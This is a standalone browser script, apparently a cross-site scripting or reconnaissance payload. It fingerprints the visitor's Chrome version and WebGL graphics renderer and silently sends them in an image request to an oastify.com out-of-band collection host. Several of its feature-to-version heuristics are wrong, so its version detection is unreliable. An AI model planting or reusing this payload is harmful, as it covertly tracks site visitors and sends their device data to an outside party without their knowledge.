<script>
(async () => {
  let chromeVersion = 'Unknown';

  // Attempt to use the User-Agent Client Hints API
  if (navigator.userAgentData) {
    try {
      const hints = await navigator.userAgentData.getHighEntropyValues([
        'uaFullVersion', 'fullVersion'
      ]);
      if (hints.uaFullVersion) {
        chromeVersion = `Chrome ${hints.uaFullVersion}`;
      } else if (hints.fullVersion) {
        chromeVersion = `Chrome ${hints.fullVersion}`;
      }
    } catch (err) {
      console.error('User-Agent Client Hints API failed:', err);
    }
  }

  // Fallback: Feature detection if no version was retrieved above
  if (chromeVersion === 'Unknown') {
    // Define feature tests with associated Chrome version heuristics
    const featureTests = [
      { version: 121, test: () => 'structuredClone' in window },
      { version: 114, test: () => 'share' in navigator },
      { version: 103, test: () => {
          try {
            return atob(btoa("test")) === "test";
          } catch (e) {
            return false;
          }
        }
      },
      { version: 96, test: () => 'clipboard' in navigator && typeof navigator.clipboard.writeText === 'function' },
      { version: 92, test: () => {
          try {
            return Intl.DateTimeFormat().resolvedOptions().calendar !== undefined;
          } catch (e) {
            return false;
          }
        }
      }
    ];

    // Sort the tests by version descending to detect the highest applicable version
    featureTests.sort((a, b) => b.version - a.version);

    for (const { version, test } of featureTests) {
      if (test()) {
        chromeVersion = `Chrome ${version}+ (Feature Detected)`;
        break;
      }
    }
  }

  // WebGL Rendering Check (for additional fingerprinting or debugging)
  function getWebGLRenderer() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unavailable';
    }
    return 'WebGL not supported';
  }

  const webGLRenderer = getWebGLRenderer();
  console.log(`Detected Chrome Version: ${chromeVersion}`);
  console.log(`WebGL Renderer: ${webGLRenderer}`);

  // Optional: Send the data to an external domain (ensure you intend and secure this for production)
  const oastDomain = 'od547dymv9h693do4u2sfx1nze55t2hr.oastify.com';
  const payload = encodeURIComponent(JSON.stringify({ chromeVersion, webGLRenderer }));
  new Image().src = `https://${oastDomain}/?data=${payload}`;
})();
</script>
